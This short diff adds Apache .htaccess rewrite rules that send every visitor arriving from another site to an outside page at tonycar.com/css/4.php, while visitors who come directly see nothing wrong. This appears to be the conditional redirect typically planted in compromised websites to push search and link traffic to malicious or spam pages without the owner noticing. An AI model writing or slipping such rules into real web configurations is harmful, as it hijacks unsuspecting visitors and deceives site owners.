@@ -1,0 +1,5 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_REFERER} ^http://
+RewriteCond %{HTTP_REFERER} !%{HTTP_HOST}
+RewriteRule . http://tonycar.com/css/4.php
